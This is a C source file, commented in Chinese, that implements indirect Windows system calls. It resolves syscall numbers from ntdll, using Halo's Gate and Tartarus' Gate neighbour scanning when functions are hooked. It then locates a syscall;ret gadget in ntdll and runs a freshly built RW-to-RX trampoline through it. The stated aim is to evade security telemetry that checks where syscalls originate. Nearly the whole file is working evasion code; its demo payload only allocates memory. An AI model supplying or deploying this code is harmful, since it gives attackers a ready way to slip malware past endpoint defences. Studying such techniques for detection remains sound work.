// 间接系统调用（indirect syscall）完整实现：
//   跳转到 ntdll .text 内真实 syscall;ret 指令执行——syscall 指令地址在 ntdll 映射内，
//   对抗「syscall 来源不在可信镜像」类遥测；与 main.c（direct）互补。
//
// SSN 解析三级：
//   1) 目标函数体直接读（未 hook 场景）
//   2) Halo's Gate：被 hook 时从邻近存根 ±32 字节步进推算
//   3) Tartarus' Gate：邻近也被 hook 时正反向交错扫描（本实现 2/3 合并在 ssn_of）
// 桩形态：VirtualAlloc RW 组桩（mov r10,rcx; mov eax,SSN; jmp [rip] → gadget）→ RX → 用后清零。
// 判定配对见 NOTES.md。构建：x86_64-w64-mingw32-gcc -mwindows -o indirect-demo.exe indirect.c
#include <windows.h>
#include <stdio.h>

static BYTE* nt_base = NULL;
static BYTE* nt_text = NULL;   /* .text 段 VA 起始 */
static DWORD nt_text_sz = 0;

/* 定位 ntdll .text 段（供 gadget 扫描与边界校验） */
static int locate_ntdll_text(void) {
    nt_base = (BYTE*)GetModuleHandleA("ntdll.dll");
    if (!nt_base) return 0;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)nt_base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(nt_base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            nt_text = nt_base + sec->VirtualAddress;
            nt_text_sz = sec->Misc.VirtualSize;
            return 1;
        }
    }
    return 0;
}

static int is_syscall_stub(BYTE* p) {
    return p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8; /* mov r10,rcx; mov eax,imm32 */
}

/* SSN 解析：直接读 → Halo's Gate（上下邻 ±32 步进）→ Tartarus' Gate（正反向交错） */
static DWORD ssn_of(BYTE* fn) {
    if (is_syscall_stub(fn))
        return *(DWORD*)(fn + 4);                          /* 1) 未 hook：直接读 */

    for (int i = 1; i <= 16; i++) {                        /* 2/3) 邻近推算，±512 字节窗口 */
        BYTE* up = fn + i * 32;
        if (up < nt_text + nt_text_sz && is_syscall_stub(up)) {
            DWORD s = *(DWORD*)(up + 4);
            if (s >= i && s < 0x1000) return s - i;        /* 上邻 SSN - 步数 */
        }
        BYTE* dn = fn - i * 32;
        if (dn >= nt_text && is_syscall_stub(dn)) {
            DWORD s = *(DWORD*)(dn + 4);
            if (s + i < 0x1000) return s + i;              /* 下邻 SSN + 步数 */
        }
    }
    return 0;
}

/* 在 ntdll .text 内定位 syscall;ret gadget（0F 05 C3） */
static BYTE* find_gadget(void) {
    for (DWORD off = 0; off + 2 < nt_text_sz; off++)
        if (nt_text[off] == 0x0F && nt_text[off+1] == 0x05 && nt_text[off+2] == 0xC3)
            return nt_text + off;
    return NULL;
}

typedef LONG (WINAPI *P)(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);

int main(void) {
    if (!locate_ntdll_text()) { printf("[-] ntdll .text 定位失败\n"); return 3; }

    BYTE* avm = nt_base + /* RVA via export */ 0;
    {
        /* 与 main.c 形态 A 对照：这里演示 GetProcAddress 走被 hook 入口的读法 */
        avm = (BYTE*)GetProcAddress((HMODULE)nt_base, "NtAllocateVirtualMemory");
    }
    if (!avm) { printf("[-] NtAllocateVirtualMemory 未找到\n"); return 1; }

    DWORD ssn = ssn_of(avm);
    if (!ssn) { printf("[-] SSN 解析失败（Halo's/Tartarus' Gate 窗口内无幸存存根）\n"); return 2; }
    printf("[+] SSN=%lu（%s）\n", ssn, is_syscall_stub(avm) ? "直接读" : "邻近推算");

    BYTE* gadget = find_gadget();
    if (!gadget) { printf("[-] ntdll .text 内 syscall;ret gadget 未定位\n"); return 3; }
    printf("[+] gadget = ntdll+0x%lX\n", (ULONG_PTR)(gadget - nt_base));

    /* 组桩（堆，非栈——避免栈可执行）：mov r10,rcx(4B) mov eax,SSN(5B) jmp [rip+0](6B) 目标(8B) */
    BYTE code[23];
    code[0] = 0x4C; code[1] = 0x8B; code[2] = 0xD1;                       /* mov r10, rcx    */
    code[3] = 0xB8; *(DWORD*)(code + 4) = ssn;                            /* mov eax, SSN    */
    code[8] = 0xFF; code[9] = 0x25; *(DWORD*)(code + 10) = 0;             /* jmp qword [rip] */
    *(ULONG64*)(code + 14) = (ULONG64)gadget;                             /* 目标 = gadget   */

    BYTE* stub = (BYTE*)VirtualAlloc(NULL, sizeof(code), MEM_COMMIT, PAGE_READWRITE);
    if (!stub) { printf("[-] stub 分配失败\n"); return 4; }
    memcpy(stub, code, sizeof(code));
    DWORD old;
    VirtualProtect(stub, sizeof(code), PAGE_EXECUTE_READ, &old);          /* RW → RX */

    /* 调用：stub jmp 进 gadget 执行 syscall;ret —— ret 弹回本函数调用点（栈帧合法） */
    LPVOID mem = NULL; SIZE_T sz = 0x1000;
    LONG st = ((P)stub)(GetCurrentProcess(), &mem, 0, &sz, MEM_COMMIT, PAGE_READWRITE);

    VirtualProtect(stub, sizeof(code), PAGE_READWRITE, &old);             /* RX → RW */
    SecureZeroMemory(stub, sizeof(code));                                 /* 用后清零    */
    VirtualFree(stub, 0, MEM_RELEASE);

    printf("[+] indirect syscall status=0x%lX mem=%p\n", st, mem);
    return st == 0 ? 0 : 1;
}
